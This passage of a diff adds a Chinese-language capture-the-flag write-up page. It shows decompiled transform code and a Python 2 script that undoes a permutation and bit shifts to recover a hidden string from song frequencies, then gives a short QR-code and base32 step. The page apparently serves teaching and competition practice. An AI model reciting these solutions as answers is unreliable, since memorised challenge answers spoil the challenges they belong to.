+<span class="p">{</span>
+  <span class="n">u1</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+13h] [rbp-5h]
+</span>
+  <span class="n">v1</span><span class="p">.</span><span class="n">fst</span><span class="p">.</span><span class="n">field_4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v1</span><span class="p">.</span><span class="n">fst</span><span class="p">.</span><span class="n">field_0</span> <span class="o">=</span> <span class="o">*</span><span class="n">freq_input</span><span class="p">;</span>
+  <span class="k">while</span> <span class="p">(</span> <span class="n">tab</span><span class="p">[</span><span class="n">v1</span><span class="p">.</span><span class="n">snd</span><span class="p">.</span><span class="n">field_1</span><span class="p">]</span> <span class="p">)</span>                 <span class="c1">// initially 0
+</span>  <span class="p">{</span>
+    <span class="n">freq_input</span><span class="p">[</span><span class="n">v1</span><span class="p">.</span><span class="n">snd</span><span class="p">.</span><span class="n">field_1</span><span class="p">]</span> <span class="o">=</span> <span class="n">freq_input</span><span class="p">[</span><span class="n">tab</span><span class="p">[</span><span class="n">v1</span><span class="p">.</span><span class="n">snd</span><span class="p">.</span><span class="n">field_1</span><span class="p">]];</span>
+    <span class="n">v1</span><span class="p">.</span><span class="n">snd</span><span class="p">.</span><span class="n">field_1</span> <span class="o">=</span> <span class="n">tab</span><span class="p">[</span><span class="n">v1</span><span class="p">.</span><span class="n">snd</span><span class="p">.</span><span class="n">field_1</span><span class="p">];</span>
+  <span class="p">}</span>
+  <span class="n">freq_input</span><span class="p">[</span><span class="n">v1</span><span class="p">.</span><span class="n">snd</span><span class="p">.</span><span class="n">field_1</span><span class="p">]</span> <span class="o">=</span> <span class="n">v1</span><span class="p">.</span><span class="n">snd</span><span class="p">.</span><span class="n">field_0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>内存结构有点乱，所以我弄了个共用体。</p>
+
+<p>大概就是，一开始<code class="prettyprint">v1.snd.field_1</code>是0，然后会做一个赋值，然后用下一个tab的值更新<code class="prettyprint">v1.snd.field_1</code>。</p>
+
+<p>最后把最后一个byte赋值成最开始备份好的idx为0处的数据。</p>
+
+<p>这个还原思路其实很简单，先弄一个<code class="prettyprint">range(0,0x26)</code>，然后做这个变换，得到一个新idx映射到旧idx的表，然后用那个信息进行还原。。。</p>
+
+<p>第二个又是一个左移右移，跟前几个差不多，只不过这次是<code class="prettyprint">i</code>会取决于<code class="prettyprint">i</code>和<code class="prettyprint">i+1</code>。。。</p>
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="nf">transform_freq_input2</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="n">a1</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+17h] [rbp-5h]
+</span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-4h]
+</span>
+  <span class="n">v2</span> <span class="o">=</span> <span class="o">*</span><span class="n">a1</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span><span class="p">;</span>
+  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">a2</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">&gt;</span> <span class="n">i</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+    <span class="n">a1</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">8</span> <span class="o">*</span> <span class="n">a1</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">|</span> <span class="p">(</span><span class="n">a1</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span><span class="p">);</span>
+  <span class="n">a1</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">8</span> <span class="o">*</span> <span class="n">a1</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">|</span> <span class="n">v2</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>这个不难，不说了。。。</p>
+
+<p>话说这题一个堆变量未初始化，一个堆溢出，搞得我以为是pwn。。。</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">rev_bit_oper</span><span class="p">(</span><span class="n">src</span><span class="p">):</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mh">0x26</span>
+    <span class="c"># a1[i] = (a1[i] &lt;&lt; 3) | (a1[i + 1] &gt;&gt; 5);</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x26</span><span class="p">):</span>
+        <span class="n">res</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">|=</span> <span class="p">(</span><span class="n">src</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">)</span>
+        <span class="n">res</span><span class="p">[(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x26</span><span class="p">]</span> <span class="o">|=</span> <span class="p">((</span><span class="n">src</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x100</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">res</span>
+
+<span class="n">out</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xe1</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xed</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0xb7</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span>
+ <span class="mh">0xe7</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0xb7</span><span class="p">,</span> <span class="mh">0xab</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x9f</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span>
+ <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0xe1</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x7b</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">]</span>
+
+<span class="n">tab</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x6</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">,</span> <span class="mh">0x1E</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x9</span><span class="p">,</span>
+<span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x7</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x0A</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span> <span class="mh">0x0C</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span>
+<span class="mh">0x0D</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">,</span> <span class="mh">0x0E</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span>
+<span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x1C</span><span class="p">,</span> <span class="mh">0x1D</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x1F</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span>
+<span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x1A</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">]</span>
+
+<span class="n">song_freq</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x00000000</span><span class="p">,</span> <span class="mh">0x00000000</span><span class="p">,</span> <span class="mh">0x00000000</span><span class="p">,</span> <span class="mh">0x00000000</span><span class="p">,</span>
+<span class="mh">0x00000000</span><span class="p">,</span> <span class="mh">0x00000000</span><span class="p">,</span> <span class="mh">0x00000000</span><span class="p">,</span> <span class="mh">0x00000000</span><span class="p">,</span>
+<span class="mh">0x00000000</span><span class="p">,</span> <span class="mh">0x00000000</span><span class="p">,</span> <span class="mh">0x00000068</span><span class="p">,</span> <span class="mh">0x0000001e</span><span class="p">,</span>
+<span class="mh">0x0000000f</span><span class="p">,</span> <span class="mh">0x0000001d</span><span class="p">,</span> <span class="mh">0x000000a9</span><span class="p">,</span> <span class="mh">0x00000013</span><span class="p">,</span>
+<span class="mh">0x00000026</span><span class="p">,</span> <span class="mh">0x00000043</span><span class="p">,</span> <span class="mh">0x0000003c</span><span class="p">,</span> <span class="mh">0x00000000</span><span class="p">,</span>
+<span class="mh">0x00000014</span><span class="p">,</span> <span class="mh">0x00000027</span><span class="p">,</span> <span class="mh">0x0000001c</span><span class="p">,</span> <span class="mh">0x00000076</span><span class="p">,</span>
+<span class="mh">0x000000a5</span><span class="p">,</span> <span class="mh">0x0000001a</span><span class="p">,</span> <span class="mh">0x00000000</span><span class="p">,</span> <span class="mh">0x0000003d</span><span class="p">,</span>
+<span class="mh">0x00000033</span><span class="p">,</span> <span class="mh">0x00000085</span><span class="p">,</span> <span class="mh">0x0000002d</span><span class="p">,</span> <span class="mh">0x00000007</span><span class="p">,</span>
+<span class="mh">0x00000022</span><span class="p">,</span> <span class="mh">0x00000000</span><span class="p">,</span> <span class="mh">0x0000003e</span><span class="p">,</span> <span class="mh">0x00000000</span><span class="p">,</span>
+<span class="mh">0x00000000</span><span class="p">,</span> <span class="mh">0x00000000</span><span class="p">,</span> <span class="mh">0x00000000</span><span class="p">,</span> <span class="mh">0x00000000</span><span class="p">,</span>
+<span class="mh">0x00000000</span><span class="p">,</span> <span class="mh">0x00000028</span><span class="p">,</span> <span class="mh">0x00000047</span><span class="p">,</span> <span class="mh">0x00000000</span><span class="p">,</span>
+<span class="mh">0x00000000</span><span class="p">,</span> <span class="mh">0x00000042</span><span class="p">,</span> <span class="mh">0x000000f5</span><span class="p">]</span>
+
+<span class="k">def</span> <span class="nf">get_assign_conversion</span><span class="p">(</span><span class="n">tab</span><span class="p">):</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">)</span>
+    <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">while</span> <span class="n">tab</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">ret</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">=</span> <span class="n">ret</span><span class="p">[</span><span class="n">tab</span><span class="p">[</span><span class="n">x</span><span class="p">]]</span>
+        <span class="n">x</span> <span class="o">=</span> <span class="n">tab</span><span class="p">[</span><span class="n">x</span><span class="p">]</span>
+    <span class="n">ret</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">return</span> <span class="n">ret</span>
+
+<span class="k">def</span> <span class="nf">get_assign</span><span class="p">(</span><span class="n">tab</span><span class="p">):</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">while</span> <span class="n">tab</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">+</span> <span class="s">" = "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">tab</span><span class="p">[</span><span class="n">x</span><span class="p">])</span>
+        <span class="n">ret</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">tab</span><span class="p">[</span><span class="n">x</span><span class="p">],</span><span class="n">x</span><span class="p">))</span>
+        <span class="n">x</span> <span class="o">=</span> <span class="n">tab</span><span class="p">[</span><span class="n">x</span><span class="p">]</span>
+    <span class="n">ret</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="mi">0</span><span class="p">,</span><span class="n">x</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">ret</span>
+
+<span class="k">def</span> <span class="nf">recover_order_2</span><span class="p">(</span><span class="n">order2</span><span class="p">,</span> <span class="n">l</span><span class="p">):</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mh">0x26</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x26</span><span class="p">):</span>
+        <span class="n">ret</span><span class="p">[</span><span class="n">order2</span><span class="p">[</span><span class="n">i</span><span class="p">]]</span> <span class="o">=</span> <span class="n">l</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+    <span class="k">return</span> <span class="n">ret</span>
+
+<span class="k">def</span> <span class="nf">recover_order</span><span class="p">(</span><span class="n">order</span><span class="p">,</span> <span class="n">l</span><span class="p">):</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>
+    <span class="n">rorder</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">order</span><span class="p">)</span>
+    <span class="n">rorder</span><span class="o">.</span><span class="n">reverse</span><span class="p">()</span>
+    <span class="k">print</span> <span class="n">rorder</span>
+    <span class="k">print</span> <span class="nb">len</span><span class="p">(</span><span class="n">rorder</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">o</span> <span class="ow">in</span> <span class="n">rorder</span><span class="p">:</span>
+        <span class="n">ret</span><span class="p">[</span><span class="n">o</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="n">l</span><span class="p">[</span><span class="n">o</span><span class="p">[</span><span class="mi">1</span><span class="p">]]</span>
+    <span class="k">return</span> <span class="n">ret</span>
+
+<span class="k">def</span> <span class="nf">frequecies_to_nums</span><span class="p">(</span><span class="n">frequecies</span><span class="p">,</span> <span class="n">freq_tab</span><span class="p">):</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">f</span> <span class="ow">in</span> <span class="n">frequecies</span><span class="p">:</span>
+        <span class="n">ret</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">freq_tab</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">f</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">ret</span>
+
+<span class="k">def</span> <span class="nf">num_to_chars</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">num</span> <span class="o">==</span> <span class="mi">45</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span>
+    <span class="k">elif</span> <span class="n">num</span> <span class="o">&gt;=</span> <span class="mi">42</span> <span class="ow">and</span> <span class="n">num</span> <span class="o">&lt;=</span> <span class="mi">44</span><span class="p">:</span>
+        <span class="k">return</span> <span class="nb">chr</span><span class="p">(</span><span class="n">num</span> <span class="o">-</span> <span class="mi">10</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">num</span> <span class="o">==</span> <span class="mi">41</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s">'</span><span class="se">\'</span><span class="s">'</span>
+    <span class="k">elif</span> <span class="n">num</span> <span class="o">==</span> <span class="mi">40</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s">','</span>
+    <span class="k">elif</span> <span class="n">num</span> <span class="o">==</span> <span class="mi">39</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s">'.'</span>
+    <span class="k">elif</span> <span class="n">num</span> <span class="o">==</span> <span class="mi">37</span> <span class="ow">or</span> <span class="n">num</span> <span class="o">==</span> <span class="mi">38</span><span class="p">:</span>
+        <span class="k">return</span> <span class="nb">chr</span><span class="p">(</span><span class="n">num</span> <span class="o">+</span> <span class="mi">21</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">num</span> <span class="o">==</span> <span class="mi">36</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s">'?'</span>
+    <span class="k">elif</span> <span class="n">num</span> <span class="o">==</span> <span class="mi">46</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s">'_'</span>
+    <span class="k">elif</span> <span class="n">num</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">num</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">:</span>
+        <span class="k">return</span> <span class="nb">chr</span><span class="p">(</span><span class="n">num</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="s">'0'</span><span class="p">))</span>
+    <span class="k">elif</span> <span class="n">num</span> <span class="o">&gt;=</span> <span class="mi">10</span> <span class="ow">and</span> <span class="n">num</span> <span class="o">&lt;=</span> <span class="mi">35</span><span class="p">:</span>
+        <span class="k">return</span> <span class="nb">chr</span><span class="p">(</span><span class="n">num</span> <span class="o">+</span> <span class="mi">87</span><span class="p">)</span> <span class="c">#55</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">assert</span> <span class="bp">False</span>
+        <span class="k">return</span> <span class="bp">None</span>
+
+
+<span class="n">rev_snd</span> <span class="o">=</span> <span class="n">rev_bit_oper</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
+<span class="k">print</span> <span class="nb">map</span><span class="p">(</span><span class="nb">hex</span><span class="p">,</span> <span class="n">rev_snd</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">rev_snd</span><span class="p">:</span>
+    <span class="k">assert</span><span class="p">(</span><span class="n">x</span> <span class="ow">in</span> <span class="n">song_freq</span><span class="p">)</span>
+
+<span class="n">frequecies</span> <span class="o">=</span> <span class="n">recover_order_2</span><span class="p">(</span><span class="n">get_assign_conversion</span><span class="p">(</span><span class="n">tab</span><span class="p">),</span> <span class="n">rev_snd</span><span class="p">)</span>
+
+<span class="k">print</span> <span class="s">"assign: "</span>
+<span class="k">print</span> <span class="n">get_assign</span><span class="p">(</span><span class="n">tab</span><span class="p">)</span>
+<span class="k">print</span> <span class="nb">map</span><span class="p">(</span><span class="nb">hex</span><span class="p">,</span> <span class="n">frequecies</span><span class="p">)</span>
+
+<span class="n">nums</span> <span class="o">=</span> <span class="n">frequecies_to_nums</span><span class="p">(</span><span class="n">frequecies</span><span class="p">,</span> <span class="n">song_freq</span><span class="p">)</span>
+<span class="k">print</span> <span class="nb">map</span><span class="p">(</span><span class="nb">hex</span><span class="p">,</span> <span class="n">nums</span><span class="p">)</span>
+
+<span class="k">print</span> <span class="s">""</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="n">num_to_chars</span><span class="p">,</span> <span class="n">nums</span><span class="p">))</span>
+</code></pre></div>
+<h2 id="aface">Aface</h2>
+
+<p>二维码用画图工具把左边的给填充一下，直接复制右上角那个就好，然后base32解码。。。</p>
+
+  </div>
+
+</article>
+
+      </div>
+    </div>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Your awesome title</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li>Your awesome title</li>
+          <li><a href="mailto:your-email@domain.com">your-email@domain.com</a></li>
+        </ul>
+      </div>
+
+      <div class="footer-col footer-col-2">
+        <ul class="social-media-list">
+          
+          <li>
+            <a href="https://github.com/jekyll"><span class="icon icon--github"><svg viewBox="0 0 16 16"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/></svg>
+</span><span class="username">jekyll</span></a>
+
+          </li>
+          
+
+          
+          <li>
+            <a href="https://twitter.com/jekyllrb"><span class="icon icon--twitter"><svg viewBox="0 0 16 16"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/></svg>
+</span><span class="username">jekyllrb</span></a>
+
+          </li>
+          
+        </ul>
+      </div>
+
+      <div class="footer-col footer-col-3">
+        <p>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.
+</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
